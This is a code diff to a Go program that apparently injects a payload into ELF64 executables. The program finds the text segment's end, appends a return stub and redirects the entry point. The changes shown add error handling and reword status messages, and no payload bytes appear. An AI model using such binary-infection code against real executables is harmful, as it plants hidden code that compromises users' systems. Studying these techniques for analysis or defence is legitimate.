@@ -121,18 +121,29 @@ func main() {
 	}
 
 	fStat, err := origFileHandle.Stat()
-	checkError(err)
-
-	// oSize := fStat.Size()
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
 
 	origFileBuf := make([]byte, fStat.Size())
-	origFileHandle.Seek(0, io.SeekStart)
-	origFileHandle.Read(origFileBuf[:])
-
-	origFileReader := bytes.NewReader(origFileBuf)
+	
+	if _, err := origFileHandle.Seek(0, io.SeekStart); err != nil {
+		fmt.Println(err)
+		return
+	}
+	
+	if _, err := origFileHandle.Read(origFileBuf[:]); err != nil {
+		fmt.Println(err)
+		return
+	}
 
 	var elfHeader elf.Header64
-	binary.Read(origFileReader, binary.LittleEndian, &elfHeader)
+	origFileReader := bytes.NewReader(origFileBuf)
+	if err :=binary.Read(origFileReader, binary.LittleEndian, &elfHeader); err != nil {
+		fmt.Println(err)
+		return
+	}
 
 	//save the original entry point of the program and old offset of section hdr table
 	var oEntry uint64
@@ -146,7 +157,10 @@ func main() {
 	//[3]locate program header table
 	pHeaders := make([]elf.Prog64, elfHeader.Phnum)
 	phSectionReader := io.NewSectionReader(origFileReader, int64(elfHeader.Phoff), int64(elfHeader.Phentsize*elfHeader.Phnum))
-	binary.Read(phSectionReader, binary.LittleEndian, pHeaders)
+	if err := binary.Read(phSectionReader, binary.LittleEndian, pHeaders); err != nil {
+		fmt.Println(err)
+		return
+	}
 
 	/*
 		Need to save the index of the .text segment when you find it.
@@ -167,11 +181,12 @@ func main() {
 			}
 			//[5] && [6]
 			textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
-			fmt.Printf("text segment ends @ 0x%x\n", textSegEnd)
-			fmt.Printf("Payload size pre-epilogue 0x%x", len(payload64))
+			fmt.Printf("[+] Text segment ends @ 0x%x\n", textSegEnd)
+			fmt.Printf("[+] Payload size pre-epilogue 0x%x\n", len(payload64))
+
 			retStub = modEpilogue64(int32(len(payload64) + 5), elfHeader.Entry, oEntry)
 			payload64 = append(payload64, retStub...)
-			fmt.Printf("Payload size post-epilogue 0x%x", len(payload64))
+			fmt.Printf("[+] Payload size post-epilogue 0x%x\n", len(payload64))
 
 			fmt.Print("[")
 			for _, h := range payload64 {
